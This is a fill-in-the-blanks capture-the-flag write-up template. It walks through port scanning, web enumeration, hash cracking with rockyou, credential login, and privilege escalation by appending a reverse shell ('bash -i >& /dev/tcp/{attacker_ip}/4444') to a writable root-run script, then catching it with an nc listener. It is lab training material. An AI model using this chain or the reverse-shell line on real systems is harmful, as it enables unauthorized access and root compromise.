# Hacking Challenge Write-Up Template

## Initial Enumeration

The only initial information provided is an IP address. We begin by conducting an Nmap scan to identify open ports and services:

```bash
nmap -sC -sV -v {target_ip}
```

### Scan Results:
```
{PORT}/tcp open {SERVICE} {VERSION}
{PORT}/tcp open {SERVICE} {VERSION}
...
```

## Web Enumeration

Navigating to the webpage hosted on port {PORT}, we analyze the content for useful information. Any potential attack vectors, such as login forms, directory structures, or disclosed credentials, are noted.

Further enumeration may involve:
```bash
gobuster dir -u http://{target_ip} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

or

```bash
nikto -h http://{target_ip}
```

If credentials or hashes are found, they can be cracked using tools like Hashcat or John the Ripper:
```bash
hashcat -m {HASH_TYPE} hash.txt /usr/share/wordlists/rockyou.txt
```

## Access via Discovered Credentials

Using any found credentials, we attempt to log in via discovered services (e.g., SSH, FTP, POP3, IMAP).

```bash
ssh {username}@{target_ip}
```

or

```bash
telnet {target_ip} {PORT}
```

If email services are available, checking emails may reveal further credentials or hints.

## Privilege Escalation

Once access is obtained, we enumerate for privilege escalation vectors:
```bash
sudo -l
```

Checking for misconfigured scripts:
```bash
ls -la /opt/
cat /opt/{script}.sh
```

If a script is writable, modifying it to execute a reverse shell can escalate privileges:
```bash
echo "bash -i >& /dev/tcp/{attacker_ip}/4444 0>&1" >> /opt/{script}.sh
```

Setting up a listener:
```bash
nc -lvnp 4444
```

## Root Access & Capture the Flag

Upon successful privilege escalation, we navigate to the root directory to retrieve the flag:
```bash
cat /root/root.txt
```

### Notes:
- Enhance enumeration techniques with LinPEAS or automated tools.
- Document any alternative attack paths.
- Practice safe engagement and ethical hacking principles.
